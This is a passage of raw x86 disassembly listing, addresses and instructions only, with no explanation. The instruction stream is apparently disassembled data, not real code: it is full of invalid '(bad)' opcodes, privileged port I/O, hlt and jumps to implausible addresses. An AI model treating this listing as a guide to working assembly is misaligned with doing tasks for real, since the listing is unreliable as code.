  42448d:	xor    BYTE PTR [edi+0x21],0x4d
  424491:	xlat   BYTE PTR ds:[ebx]
  424492:	xchg   DWORD PTR [eax-0x72c5cd33],eax
  424498:	lea    ecx,[ebp+0xa]
  42449b:	and    DWORD PTR [edi+esi*2-0x7d],edi
  42449f:	add    dl,ch
  4244a1:	cs jne 0x424520
  4244a4:	ja     0x424429
  4244a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244a7:	push   ss
  4244a8:	outs   dx,DWORD PTR ds:[esi]
  4244a9:	cmp    BYTE PTR [eax-0x687f7510],al
  4244af:	mov    dl,BYTE PTR [ebx+0x51]
  4244b2:	push   ebx
  4244b3:	pushf  
  4244b4:	mov    dl,0xbe
  4244b6:	or     al,0xb2
  4244b8:	clc    
  4244b9:	sub    edi,edi
  4244bb:	(bad)  
  4244bc:	push   eax
  4244bd:	ja     0x4244b8
  4244bf:	arpl   bp,di
  4244c1:	xlat   BYTE PTR ds:[ebx]
  4244c2:	pop    ecx
  4244c3:	xor    BYTE PTR [edi-0x75],0x80
  4244c7:	lock mov edx,DWORD PTR [ebx-0x4]
  4244cb:	push   ebx
  4244cc:	sub    dh,BYTE PTR [edx-0x794dd646]
  4244d2:	or     al,0xff
  4244d4:	mov    dl,0x80
  4244d6:	lock add DWORD PTR [eax-0x63ac7c69],0x53
  4244de:	push   ecx
  4244df:	mov    dl,0xf8
  4244e1:	sub    esp,ebp
  4244e3:	add    BYTE PTR [eax-0x327fde89],0x32
  4244ea:	cmp    cl,BYTE PTR [ebp+0xcbeb28d]
  4244f0:	push   DWORD PTR [esi-0x556bddf7]
  4244f6:	dec    ebp
  4244f7:	or     dh,BYTE PTR ds:0x808a7780
  4244fd:	lock mov dl,BYTE PTR [ebx-0x4]
  424501:	push   ebx
  424502:	sub    dh,BYTE PTR [edx-0x454df37a]
  424508:	sub    edi,edi
  42450a:	mov    dl,0x63
  42450c:	ja     0x424507
  42450e:	xlat   BYTE PTR ds:[ebx]
  42450f:	mov    al,0x80
  424511:	ja     0x424495
  424513:	xor    al,0x82
  424516:	push   ebx
  424517:	sub    dl,BYTE PTR [ebx-0x4]
  42451a:	mov    dl,0x86
  42451c:	or     al,0xb2
  42451e:	mov    edx,0x63fdff29
  424523:	mov    al,ds:0x4d954c09
  424528:	dec    ebp
  424529:	dec    ebp
  42452a:	xor    BYTE PTR [edi-0x76],0x80
  42452e:	lock mov dl,BYTE PTR [ebx-0x4]
  424532:	push   ebx
  424533:	sub    dh,BYTE PTR [edx-0x454df37a]
  424539:	sub    edi,edi
  42453b:	mov    dl,0x63
  42453d:	ja     0x424538
  42453f:	xlat   BYTE PTR ds:[ebx]
  424540:	mov    al,0x80
  424542:	ja     0x4244cf
  424544:	xor    al,0x8b
  424547:	push   ebx
  424548:	cld    
  424549:	push   ebx
  42454a:	sub    dh,BYTE PTR [edx-0x454df37a]
  424550:	sub    edi,edi
  424552:	mov    dl,0x3a
  424554:	ja     0x4244dc
  424556:	mov    esi,0x8d8d3aae
  42455b:	jl     0x4245d4
  42455d:	xchg   DWORD PTR [ecx+0x7c66f7ea],esi
  424563:	ja     0x42452d
  424565:	fld    DWORD PTR [ebp-0x587f12e3]
  42456b:	mov    al,BYTE PTR [eax+0x4538a77]
  424571:	push   ebx
  424572:	jl     0x424526
  424574:	les    ecx,FWORD PTR [edx+esi*4]
  424577:	test   BYTE PTR [ecx],ch
  424579:	inc    DWORD PTR [edx-0x72c5e442]
  42457f:	lea    eax,[eax-0xf7f7589]
  424585:	mov    dl,BYTE PTR [ebx-0x4]
  424588:	push   ebx
  424589:	sub    dh,BYTE PTR [edx-0x454df37a]
  42458f:	sub    edi,edi
  424591:	mov    dl,0x50
  424593:	ja     0x42451c
  424595:	xor    BYTE PTR [edi-0x76],0x80
  424599:	lock mov dl,BYTE PTR [ebx-0x4]
  42459d:	push   ebx
  42459e:	sub    dh,BYTE PTR [edx-0x454df37a]
  4245a4:	sub    edi,edi
  4245a6:	mov    dl,0x50
  4245a8:	ja     0x424572
  4245aa:	xor    al,0x8a
  4245ad:	xor    BYTE PTR [edi-0x76],0x53
  4245b1:	push   ecx
  4245b2:	push   ebx
  4245b3:	jl     0x424567
  4245b5:	test   BYTE PTR [ecx],ch
  4245b7:	mov    dl,0xbe
  4245b9:	or     al,0xff
  4245bb:	std    
  4245bc:	xor    BYTE PTR [edi+0x7a],0x63
  4245c0:	std    
  4245c1:	aad    0x6f
  4245c3:	sub    dh,0x1e
  4245c6:	push   eax
  4245c7:	ja     0x424550
  4245c9:	xor    BYTE PTR [edi-0x7c],0x80
  4245cd:	out    dx,al
  4245ce:	push   ds
  4245cf:	push   eax
  4245d0:	ja     0x42459a
  4245d2:	xor    BYTE PTR [edi-0x76],0x80
  4245d6:	lock mov dl,BYTE PTR [ebx-0x4]
  4245da:	push   ebx
  4245db:	sub    dh,BYTE PTR [edx-0x794dd646]
  4245e1:	or     al,0xff
  4245e3:	mov    dl,0x80
  4245e5:	lock xchg DWORD PTR [ebx-0x4e],esp
  4245e9:	aad    0x55
  4245eb:	xor    BYTE PTR [edi-0x76],0x80
  4245ef:	lock mov dl,BYTE PTR [ebx+0x2a]
  4245f3:	push   ebx
  4245f4:	cld    
  4245f5:	mov    dl,0xba
  4245f7:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4245fd:	xor    al,0x87
  424600:	mov    dl,0xbe
  424602:	sub    esp,DWORD PTR [ebx-0x4e]
  424605:	aad    0x1d
  424607:	xor    al,0x87
  42460a:	xor    BYTE PTR [edi+0x21],0x80
  42460e:	int    0x32
  424610:	cmp    cl,BYTE PTR [ebp+0x705c098d]
  424616:	xchg   esi,eax
  424617:	dec    ebp
  424618:	xlat   BYTE PTR ds:[ebx]
  424619:	stc    
  42461a:	dec    ebp
  42461b:	or     ch,bh
  42461d:	les    ebx,FWORD PTR [edi]
  42461f:	xor    BYTE PTR [edi-0x38],0xec
  424623:	ja     0x424614
  424625:	xor    al,0x21
  424628:	adc    BYTE PTR [eax+0x32],0x3a
  42462c:	lea    ecx,[ebp+0xa0c6aed]
  424632:	dec    ebp
  424633:	xlat   BYTE PTR ds:[ebx]
  424634:	stc    
  424635:	dec    ebp
  424636:	xchg   esi,eax
  424637:	out    dx,eax
  424638:	push   eax
  424639:	ja     0x424603
  42463b:	xor    BYTE PTR [edi-0x76],0x80
  42463f:	lock mov dl,BYTE PTR [ebx-0x4]
  424643:	push   ebx
  424644:	sub    dh,BYTE PTR [edx-0x794dd646]
  42464a:	or     al,0xff
  42464c:	mov    dl,0x80
  42464e:	lock enter 0xb263,0x80
  424653:	ja     0x4245e0
  424655:	xor    al,0x8b
  424658:	xlat   BYTE PTR ds:[ebx]
  424659:	push   cs
  42465a:	push   ebx
  42465b:	cld    
  42465c:	push   ebx
  42465d:	sub    dh,BYTE PTR [edx-0x454df37a]
  424663:	sub    edi,edi
  424665:	mov    dl,0x3a
  424667:	ja     0x4245ef
  424669:	les    ebx,FWORD PTR ds:0xfc532a53
  42466f:	mov    dl,0xba
  424671:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424677:	xor    al,0xc8
  42467a:	or     DWORD PTR [edx],esp
  42467c:	mov    dl,0x80
  42467e:	lock test BYTE PTR [eax-0x12],dl
  424682:	and    BYTE PTR [eax-0xf7f7489],al
  424688:	mov    edx,DWORD PTR [ebx-0x4]
  42468b:	push   ebx
  42468c:	sub    dh,BYTE PTR [edx-0x454df37a]
  424692:	sub    edi,edi
  424694:	mov    dl,0xec
  424696:	add    BYTE PTR [eax-0xf7f7589],0x8a
  42469d:	push   ebx
  42469e:	sub    dl,BYTE PTR [ebx-0x4]
  4246a1:	mov    dl,0xba
  4246a3:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4246a9:	xor    al,0x84
  4246ac:	pop    edi
  4246ad:	out    dx,al
  4246ae:	and    BYTE PTR [ecx],cl
  4246b0:	dec    edi
  4246b1:	adc    DWORD PTR ds:0x77804d4d,ecx
  4246b7:	xor    al,BYTE PTR [eax-0x4d92cd10]
  4246bd:	xchg   BYTE PTR [ecx],ch
  4246bf:	add    DWORD PTR [ecx],esp
  4246c1:	add    esi,ebp
  4246c3:	lea    ecx,[ebp-0x7f4d0073]
  4246c9:	lock not DWORD PTR [edi-0xa]
  4246cd:	and    al,0x6f
  4246cf:	cmp    BYTE PTR [esi+0x4d4d8afe],bh
  4246d5:	xor    BYTE PTR [edi-0x76],0x80
  4246d9:	lock mov dl,BYTE PTR [ebx-0x4]
  4246dd:	push   ebx
  4246de:	sub    dh,BYTE PTR [edx-0x454df37a]
  4246e4:	sub    edi,edi
  4246e6:	mov    dl,0x5f
  4246e8:	ja     0x424670
  4246ea:	xlat   BYTE PTR ds:[ebx]
  4246eb:	out    dx,eax
  4246ec:	xor    BYTE PTR [edi-0x75],0x80
  4246f0:	lock mov eax,esp
  4246f3:	outs   dx,DWORD PTR ds:[esi]
  4246f4:	xor    BYTE PTR [edi-0x76],0x80
  4246f8:	lock mov dl,BYTE PTR [ebx+0x2a]
  4246fc:	push   ebx
  4246fd:	cld    
  4246fe:	stos   DWORD PTR es:[edi],eax
  4246ff:	mov    dl,0xba
  424701:	sub    DWORD PTR [edx-0x56f37a],esi
  424707:	mov    dl,0xa3
  424709:	jo     0x424706
  42470b:	out    dx,eax
  42470c:	lea    edx,[edi-0x78127880]
  424712:	xor    eax,0xf68a777c
  424717:	and    al,0x6f
  424719:	cmp    BYTE PTR [edi+esi*2-0x7c],bh
  42471d:	cmc    
  42471e:	and    al,0x6f
  424720:	cmp    BYTE PTR [eax+0x77502177],al
  424726:	and    DWORD PTR [ecx+0x77806a80],ebx
  42472c:	mov    al,BYTE PTR [eax+0xde28a97]
  424732:	pusha  
  424733:	and    ah,BYTE PTR [edi+ebp*2]
  424736:	cmp    BYTE PTR [ebx-0x4e],dl
  424739:	test   eax,0xf8b27e53
  42473e:	sub    DWORD PTR [edx-0x400f37a],esi
  424744:	adc    BYTE PTR [edi+0x9f763ef],0xf
  42474b:	loopne 0x424787
  42474d:	lea    ecx,[ebp-0x7f108880]
  424753:	xchg   edi,eax
  424754:	out    dx,eax
  424755:	in     al,dx
  424756:	or     ah,BYTE PTR [ebp-0x65]
  424759:	push   eax
  42475a:	xchg   edi,eax
  42475b:	enter  0x777c,0x8b
  42475f:	icebp  
  424760:	and    al,0x6f
  424762:	cmp    BYTE PTR [eax-0x687f7489],al
  424768:	mov    edx,DWORD PTR [ebx+0x7e]
  42476b:	mov    dl,0xf8
  42476d:	sub    DWORD PTR [ebx-0x4e],edx
  424770:	mov    dl,0x86
  424772:	or     al,0xff
  424774:	sti    
  424775:	adc    BYTE PTR [edi-0x75187f76],0x53
  42477c:	mov    dh,0x53
  42477e:	or     eax,0xb229bcb2
  424783:	pop    es
  424784:	or     al,0xff
  424786:	pushf  
  424787:	and    bh,0xc8
  42478a:	pop    edi
  42478b:	xchg   ebp,eax
  42478c:	jl     0x42476b
  42478e:	or     DWORD PTR [edi],ecx
  424790:	mov    bl,0x3a
  424792:	lea    ecx,[ebp-0x7f376880]
  424798:	ja     0x424789
  42479a:	in     al,dx
  42479b:	jmp    0x9780:0x8d8d8d2e
  4247a2:	out    dx,eax
  4247a3:	and    bh,0xc8
  4247a6:	inc    ebx
  4247a7:	fwait
  4247a8:	push   ebp
  4247a9:	and    bh,0x8a
  4247ac:	xchg   ebx,eax
  4247ad:	and    BYTE PTR [edi+0x53cb538a],0x4
  4247b4:	mov    dl,0x61
  4247b6:	or     al,0xb2
  4247b8:	mov    ah,0x29
  4247ba:	inc    DWORD PTR [esi]
  4247bc:	push   eax
  4247bd:	xchg   edi,eax
  4247be:	and    DWORD PTR [ebx-0x64],0x9
  4247c2:	jns    0x80cfd502
  4247c8:	xchg   edi,eax
  4247c9:	mov    al,BYTE PTR [eax-0x49ac7519]
  4247cf:	push   ebx
  4247d0:	or     eax,0xb20c07b2
  4247d5:	mov    esp,0x509cff29
  4247da:	xchg   edi,eax
  4247db:	xor    bh,BYTE PTR [edi+esi*2+0x21]
  4247df:	repz and al,0x6f
  4247e2:	cmp    BYTE PTR [eax-0x187f7569],al
  4247e8:	mov    dl,BYTE PTR [ebx-0x4a]
  4247eb:	push   ebx
  4247ec:	or     eax,0xb20c07b2
  4247f1:	mov    esp,0xbe9cff29
  4247f6:	add    eax,0x808d8d8d
  4247fb:	xchg   edi,eax
  4247fc:	mov    al,BYTE PTR [eax+0xbed8ad7]
  424802:	or     eax,0x2b2b653
  424807:	sub    DWORD PTR [edx+0x7eff0c07],esi
  42480d:	add    ebx,edx
  42480f:	mov    esi,DWORD PTR [esi+0x97e6388]
  424815:	in     eax,dx
  424816:	jmp    0x43cfd5a8
  42481b:	ret    0xe501
  42481e:	or     ch,bh
  424820:	push   eax
  424821:	xlat   BYTE PTR ds:[ebx]
  424822:	stc    
  424823:	or     DWORD PTR [ebx+ebx*1-0x5e],ebx
  424827:	clc    
  424828:	dec    ebp
  424829:	or     DWORD PTR [ebp-0x7868af73],ecx
  42482f:	adc    BYTE PTR [edi-0x7f8e1379],0xd7
  424836:	xchg   esp,ebp
  424838:	xor    DWORD PTR [edx+0x2b22907],0x9c2ff0c
  424842:	pop    esp
  424843:	sbb    esi,DWORD PTR [edx+0xba22107]
  424849:	mul    BYTE PTR [edi+ebp*2]
  42484c:	cmp    BYTE PTR [eax-0x29],dl
  42484f:	xchg   DWORD PTR [eax-0x69],edx
  424852:	xchg   BYTE PTR [eax-0x287f7869],al
  424858:	xchg   DWORD PTR [ebx-0x4a],edx
  42485b:	in     eax,dx
  42485c:	or     ecx,DWORD PTR ds:0xb20c07b2
  424862:	add    ch,BYTE PTR [ecx]
  424864:	(bad)  
  424865:	jle    0x424853
  424867:	xchg   edi,eax
  424868:	out    dx,eax
  424869:	push   eax
  42486a:	xchg   edi,eax
  42486b:	xchg   DWORD PTR [eax-0x287fde69],eax
  424871:	and    DWORD PTR [ebx-0x4a],edx
  424874:	in     eax,dx
  424875:	or     ecx,DWORD PTR ds:0xb22902b2
  42487b:	pop    es
  42487c:	or     al,0xff
  42487e:	jle    0x424800
  424880:	xlat   BYTE PTR ds:[ebx]
  424881:	xchg   BYTE PTR [ebx-0x3e],ah
  424884:	xlat   BYTE PTR ds:[ebx]
  424885:	rol    BYTE PTR [eax-0x287fde69],0x21
  42488c:	push   ebx
  42488d:	mov    dh,0xed
  42488f:	or     ecx,DWORD PTR ds:0xb22902b2
  424895:	pop    es
  424896:	or     al,0xff
  424898:	jle    0x42481a
  42489a:	xlat   BYTE PTR ds:[ebx]
  42489b:	xchg   BYTE PTR [ebx-0x3e],ah
  42489e:	xlat   BYTE PTR ds:[ebx]
  42489f:	out    dx,eax
  4248a0:	adc    BYTE PTR [edi-0x7c287f79],0x3a
  4248a7:	aam    0xed
  4248a9:	jl     0x4248b7
  4248ab:	dec    ebp
  4248ac:	lock stc 
  4248ae:	or     DWORD PTR [edi+0x12],ecx
  4248b1:	dec    ebp
  4248b2:	dec    ebp
  4248b3:	dec    ebp
  4248b4:	cmp    ah,BYTE PTR [edi-0x74687fce]
  4248ba:	adc    bh,0x8b
  4248bd:	push   ebx
  4248be:	mov    dh,0xed
  4248c0:	or     ecx,DWORD PTR ds:0xb22902b2
  4248c6:	pop    es
  4248c7:	or     al,0xff
  4248c9:	jle    0x42484b
  4248cb:	xlat   BYTE PTR ds:[ebx]
  4248cc:	xor    al,BYTE PTR [eax-0x2a9c3719]
  4248d2:	pushf  
  4248d3:	in     eax,0xd3
  4248d5:	sub    eax,0x808a9780
  4248da:	xlat   BYTE PTR ds:[ebx]
  4248db:	mov    dl,BYTE PTR [ebx-0x4a]
  4248de:	in     eax,dx
  4248df:	or     ecx,DWORD PTR ds:0xb20c07b2
  4248e5:	add    ch,BYTE PTR [ecx]
  4248e7:	in     al,dx
  4248e8:	je     0x4248e9
  4248ea:	jle    0x42486c
  4248ec:	popf   
  4248ed:	out    dx,al
  4248ee:	arpl   WORD PTR [ebx],ax
  4248f0:	or     DWORD PTR [edi-0x12],ecx
  4248f3:	dec    ebp
  4248f4:	dec    ebp
  4248f5:	dec    ebp
  4248f6:	mov    ds:0x53847780,eax
  4248fb:	mov    dl,0x80
  4248fd:	lock test ch,ch
  424900:	add    eax,0xa6c4ab0d
  424905:	xor    BYTE PTR [edi-0x76],0x53
  424909:	mov    dl,0x80
  42490b:	lock mov dl,BYTE PTR [ebx+0x51]
  42490f:	mov    dl,0xba
  424911:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424917:	test   eax,0x8deffb70
  42491c:	xchg   edi,eax
  42491d:	add    BYTE PTR [edi-0x7285785e],0x8d
  424924:	lea    edi,[edi+esi*2-0x76]
  424928:	mul    BYTE PTR [edi+ebp*2]
  42492b:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  42492f:	cmc    
  424930:	and    al,0x6f
  424932:	cmp    BYTE PTR [eax-0xf7f7589],al
  424938:	mov    bl,BYTE PTR [ecx-0x5f21d65]
  42493e:	and    ah,BYTE PTR [edi+ebp*2]
  424941:	cmp    BYTE PTR [ebx-0x4],dl
  424944:	mov    dl,0x86
  424946:	or     al,0xae
  424948:	push   ebx
  424949:	(bad)  
  42494a:	mov    dl,0xba
  42494c:	sub    edi,edi
  42494e:	mov    dl,0x50
  424950:	ja     0x4248d6
  424952:	xor    BYTE PTR [edi-0x76],0x80
  424956:	lock mov dl,BYTE PTR [ebx-0x4]
  42495a:	mov    dl,0x86
  42495c:	or     al,0x53
  42495e:	(bad)  
  42495f:	mov    dl,0xba
  424961:	sub    edi,edi
  424963:	mov    dl,0x50
  424965:	ja     0x42495e
  424967:	and    bh,0x25
  42496a:	xor    BYTE PTR [edi-0x79],0x80
  42496e:	lock xchg DWORD PTR [ebx-0x4e],edx
  424972:	push   eax
  424973:	ja     0x4248fc
  424975:	mov    ds:0xa3f68777,al
  42497a:	outs   dx,DWORD PTR ds:[esi]
  42497b:	cmp    BYTE PTR [eax-0xf7f3789],al
  424981:	enter  0xb253,0x50
  424985:	ja     0x42494f
  424987:	mov    ds:0xe9f6c877,al
  42498c:	outs   dx,DWORD PTR ds:[esi]
  42498d:	cmp    BYTE PTR [eax-0xf7fcd89],al
  424993:	xor    dl,BYTE PTR [ebx-0x4e]
  424996:	push   eax
  424997:	ja     0x4249cb
  424999:	mov    ds:0x24fa3277,al
  42499e:	outs   dx,DWORD PTR ds:[esi]
  42499f:	cmp    BYTE PTR [eax-0xf7f0689],al
  4249a5:	stc    
  4249a6:	push   ebx
  4249a7:	mov    dl,0x50
  4249a9:	ja     0x4249a4
  4249ab:	mov    ds:0x24f6f977,al
  4249b0:	out    dx,al
  4249b1:	cmp    BYTE PTR [edi+esi*2+0x25],bh
  4249b5:	jmp    0x807ad67c
  4249ba:	ja     0x4249ab
  4249bc:	dec    edi
  4249bd:	push   0x9
  4249bf:	movd   mm5,DWORD PTR [edi]
  4249c2:	lea    ecx,[ebp+0x4f217780]
  4249c8:	push   0x9
  4249ca:	(bad)  
  4249cc:	das    
  4249cd:	lea    ecx,[ebp+0x4f1d7780]
  4249d3:	push   0x9
  4249d5:	mov    db5,edi
  4249d8:	lea    ecx,[ebp-0x7fda8880]
  4249de:	ja     0x424a05
  4249e0:	xor    al,0xef
  4249e3:	mov    dl,0x86
  4249e5:	or     al,0x57
  4249e7:	(bad)  
  4249e8:	hlt    
  4249e9:	lea    ecx,[ebp+0x93a5fb9]
  4249ef:	dec    edi
  4249f0:	cmp    ch,BYTE PTR [edi]
  4249f2:	lea    ecx,[ebp-0x7f758880]
  4249f8:	lock mov dl,BYTE PTR [ebx-0x4]
  4249fc:	mov    dl,0x86
  4249fe:	or     al,0x53
  424a00:	(bad)  
  424a01:	mov    dl,0xba
  424a03:	sub    edi,edi
  424a05:	mov    dl,0x50
  424a07:	ja     0x424a00
  424a09:	xor    BYTE PTR [edi-0x76],0x80
  424a0d:	ja     0x424999
  424a0f:	xor    BYTE PTR [edi-0x11],0x80
  424a13:	lock out dx,eax
  424a15:	in     al,dx
  424a16:	jge    0x424a7d
  424a18:	adc    BYTE PTR [edx+0x25f0500a],0x4f
  424a1f:	push   0x9
  424a21:	cvtpi2ps xmm5,mm6
  424a24:	lea    ecx,[ebp-0x9858884]
  424a2a:	and    al,0x79
  424a2c:	cmp    BYTE PTR [eax-0x7f6c8589],al
  424a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a33:	jp     0x424a88
  424a35:	cld    
  424a36:	push   ebx
  424a37:	add    esi,DWORD PTR [edx-0x4b4df37a]
  424a3d:	sub    edi,edi
  424a3f:	adc    BYTE PTR [eax-0x59],0x7a
  424a43:	xor    BYTE PTR [edi-0x76],0x80
  424a47:	ja     0x4249d3
  424a49:	or     dh,0x2e
  424a4c:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  424a52:	stos   BYTE PTR es:[edi],al
  424a53:	gs in  al,dx
  424a55:	jno    0x4249d7
  424a57:	ja     0x4249e3
  424a59:	xor    BYTE PTR [edi-0x76],0x80
  424a5d:	into   
  424a5e:	cmp    cl,BYTE PTR es:[ebp+0x501d808d]
  424a65:	xchg   edi,eax
  424a66:	and    DWORD PTR [ebx-0x5c],esp
  424a69:	xlat   BYTE PTR ds:[ebx]
  424a6a:	imul   eax,DWORD PTR [eax-0x317f3710],0x32
  424a71:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424a77:	stos   BYTE PTR es:[edi],al
  424a78:	adc    BYTE PTR [edi-0x12aeac38],0xc2
  424a7f:	or     eax,0xb20cbeb2
  424a84:	clc    
  424a85:	sub    edi,edi
  424a87:	mov    dh,0x80
  424a89:	lock and DWORD PTR [edx-0x6cf561b3],ebp
  424a90:	dec    ebp
  424a91:	or     ah,BYTE PTR ds:0x8021f080
  424a97:	xchg   edx,eax
  424a98:	xchg   ebp,eax
  424a99:	cmp    BYTE PTR [edi+0xa],0x43
  424a9d:	std    
  424a9e:	xchg   esi,eax
  424a9f:	in     al,dx
  424aa0:	je     0x424aac
  424aa2:	xchg   BYTE PTR [ecx-0x7f727291],ah
  424aa8:	lock and eax,0x3a36ce80
  424aae:	lea    ecx,[ebp-0x61b2e2b0]
  424ab4:	xchg   ebp,eax
  424ab5:	dec    ebp
  424ab6:	xlat   BYTE PTR ds:[ebx]
  424ab7:	out    dx,eax
  424ab8:	xchg   ebx,eax
  424ab9:	xchg   BYTE PTR [edi-0x7f727212],ch
  424abf:	xchg   ebx,eax
  424ac0:	gs in  al,dx
  424ac2:	xchg   esp,eax
  424ac3:	or     DWORD PTR [eax+ebx*8+0x15],ebx
  424ac7:	add    DWORD PTR [ebp+0x71],esi
  424aca:	sbb    eax,0x801d7750
  424acf:	ja     0x424a5b
  424ad1:	xor    al,0x8a
  424ad4:	push   ebx
  424ad5:	cld    
  424ad6:	in     eax,dx
  424ad7:	add    eax,0x29bab20d
  424adc:	mov    dl,0x86
  424ade:	or     al,0xff
  424ae0:	mov    dl,0x9
  424ae2:	pop    esp
  424ae3:	fisubr DWORD PTR [edi+0x50]
  424ae6:	xchg   edi,eax
  424ae7:	and    eax,0xf09fd63
  424aec:	mov    esp,0x808d8d8d
  424af1:	ja     0x424a7d
  424af3:	xor    al,0x8a
  424af6:	push   ebx
  424af7:	cld    
  424af8:	in     eax,dx
  424af9:	add    eax,0x29bab20d
  424afe:	mov    dl,0x86
  424b00:	or     al,0xff
  424b02:	mov    dl,0x50
  424b04:	ja     0x424a89
  424b06:	xor    BYTE PTR [edi-0x75],0x80
  424b0a:	lock mov ebp,ebp
  424b0d:	add    eax,0xb2fc530d
  424b12:	mov    edx,0xc86b229
  424b17:	push   DWORD PTR [edx+0x6fda5c09]
  424b1d:	inc    ebx
  424b1e:	std    
  424b1f:	pop    edi
  424b20:	lock or DWORD PTR [ecx],0xffffffce
  424b24:	and    cl,BYTE PTR [ebp-0xf7f7273]
  424b2a:	sbb    eax,0x50efb2ed
  424b2f:	lock sbb eax,0xf080ecc4
  424b35:	sbb    eax,0x805dd880
  424b3a:	push   cs
  424b3b:	push   eax
  424b3c:	ja     0x424ac0
  424b3e:	jge    0x424b8f
  424b40:	not    ebp
  424b42:	xor    BYTE PTR [ebx-0x9],cl
  424b45:	xor    edi,ebx
  424b47:	in     al,dx
  424b48:	ja     0x424acc
  424b4a:	les    ecx,FWORD PTR [eax+eax*4]
  424b4d:	sti    
  424b4e:	or     al,BYTE PTR [eax+0x74ecee92]
  424b54:	or     al,BYTE PTR [esi-0x7272d05d]
  424b5a:	xor    BYTE PTR [edi+0x1d],0x80
  424b5e:	jge    0x424b4f
  424b60:	push   eax
  424b61:	lock add BYTE PTR [eax-0x687f7510],0x8a
  424b69:	push   ebx
  424b6a:	push   ecx
  424b6b:	in     eax,dx
  424b6c:	ret    0xb20d
  424b6f:	mov    esi,0x29f8b20c
  424b74:	(bad)  
  424b75:	(bad)  
  424b76:	pop    edi
  424b77:	lock adc ch,0x1d
  424b7b:	xor    al,0xef
  424b7e:	in     al,dx
  424b7f:	jge    0x424ba2
  424b81:	dec    ebp
  424b82:	xlat   BYTE PTR ds:[ebx]
  424b83:	add    BYTE PTR [eax-0x13691193],0x74
  424b8a:	or     al,BYTE PTR [esi-0x7272137b]
  424b90:	xor    BYTE PTR [edi+0x1d],0x80
  424b94:	lock mov eax,DWORD PTR [eax+0x51538b97]
  424b9b:	mov    dl,0xbe
  424b9d:	or     al,0xed
  424b9f:	ret    0xed0d
  424ba2:	push   0x3d
  424ba4:	mov    dl,0xf8
  424ba6:	sub    edi,edi
  424ba8:	(bad)  
  424ba9:	cmp    dh,al
  424bab:	add    DWORD PTR [eax+0x77502597],0x1d
  424bb2:	xor    BYTE PTR [edi-0x75],0x80
  424bb6:	lock mov ebp,ebp
  424bb9:	add    eax,0xb2fc530d
  424bbe:	mov    edx,0xc86b229
  424bc3:	push   DWORD PTR [edx+0x925f080]
  424bc9:	pop    esp
  424bca:	jg     0x424c3b
  424bcc:	inc    ebx
  424bcd:	std    
  424bce:	pop    edi
  424bcf:	lock or DWORD PTR [ecx],0x4c
  424bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bd4:	dec    ebp
  424bd5:	dec    ebp
  424bd6:	dec    ebp
  424bd7:	or     dh,0x26
  424bda:	cmp    cl,BYTE PTR [ebp-0x28e29c73]
  424be0:	push   ebx
  424be1:	xor    al,0x32
  424be4:	or     dh,0x32
  424be7:	cmp    cl,BYTE PTR [ebp-0x7b68fe73]
  424bed:	stos   BYTE PTR es:[edi],al
  424bee:	adc    BYTE PTR [edi-0x12aeacce],0xc2
  424bf5:	or     eax,0xb20cbeb2
  424bfa:	clc    
  424bfb:	sub    edi,edi
  424bfd:	mov    dh,0x80
  424bff:	lock and DWORD PTR [edx-0x6c6a61b3],ebp
  424c06:	dec    ebp
  424c07:	or     ah,BYTE PTR ds:0xf096a4f
  424c0d:	pushf  
  424c0e:	or     al,0x8d
  424c10:	lea    eax,[eax-0x317fda69]
  424c16:	cmp    BYTE PTR [edx],0x8d
  424c19:	lea    eax,[eax+0x53fd808d]
  424c1f:	push   ecx
  424c20:	in     eax,dx
  424c21:	xor    cl,BYTE PTR ds:0xb20cbeb2
  424c27:	test   BYTE PTR [ecx],ch
  424c29:	(bad)  
  424c2a:	std    
  424c2b:	or     DWORD PTR [edi],ecx
  424c2d:	jb     0x424c69
  424c2f:	lea    ecx,[ebp-0x7f758880]
  424c35:	lock mov dl,BYTE PTR [ebx-0x4]
  424c39:	in     eax,dx
  424c3a:	add    eax,0xc86b20d
  424c3f:	mov    dl,0xba
  424c41:	sub    edi,edi
  424c43:	mov    dl,0x50
  424c45:	ja     0x424bcd
  424c47:	pop    esi
  424c48:	imul   ebp,ecx,0x7d01386f
  424c4e:	test   BYTE PTR [eax-0x10],dl
  424c51:	pop    esi
  424c52:	push   eax
  424c53:	lock data16 jl 0x424cce
  424c57:	inc    esi
  424c58:	sbb    ecx,ebp
  424c5a:	outs   dx,DWORD PTR ds:[esi]
  424c5b:	cmp    BYTE PTR [edi+esi*2+0x62],bh
  424c5f:	call   0x507abc4d
  424c64:	ja     0x424cbc
  424c66:	jl     0x424cdf
  424c68:	push   0xfffffff6
  424c6a:	and    al,0x6f
  424c6c:	cmp    BYTE PTR [ebx+0x70],dl
  424c6f:	adc    BYTE PTR [ebp+0x7b24601],0xc
  424c76:	mov    ds:0x8df4c4c2,al
  424c7b:	lea    edi,[ecx+0x75f01650]
  424c81:	dec    ebp
  424c82:	dec    ebp
  424c83:	dec    ebp
  424c84:	xchg   edx,eax
  424c85:	in     eax,dx
  424c86:	retf   
  424c87:	outs   dx,DWORD PTR ds:[esi]
  424c88:	in     al,0xb8
  424c8a:	pusha  
  424c8b:	mov    ecx,0x50386fe9
  424c90:	dec    edi
  424c91:	xchg   ebp,eax
  424c92:	dec    ebp
  424c93:	dec    ebp
  424c94:	dec    ebp
  424c95:	push   eax
  424c96:	dec    edi
  424c97:	mov    ebp,0x504d4d4d
  424c9c:	ja     0x424cf8
  424c9e:	push   eax
  424c9f:	ja     0x424cb7
  424ca1:	add    DWORD PTR [edx+0xa96018a],edx
  424ca7:	push   eax
  424ca8:	ja     0x424cd8
  424caa:	push   eax
  424cab:	ja     0x424ce3
  424cad:	jl     0x424cfe
  424caf:	or     cl,BYTE PTR [ebp+0x4d]
  424cb2:	dec    ebp
  424cb3:	bnd jmp 0x1928528
  424cb9:	popf   
  424cba:	dec    ebp
  424cbb:	dec    ebp
  424cbc:	dec    ebp
  424cbd:	push   eax
  424cbe:	sbb    BYTE PTR [ebp+0x7c4d4d4d],ah
  424cc4:	dec    edi
  424cc5:	lods   eax,DWORD PTR ds:[esi]
  424cc6:	dec    ebp
  424cc7:	dec    ebp
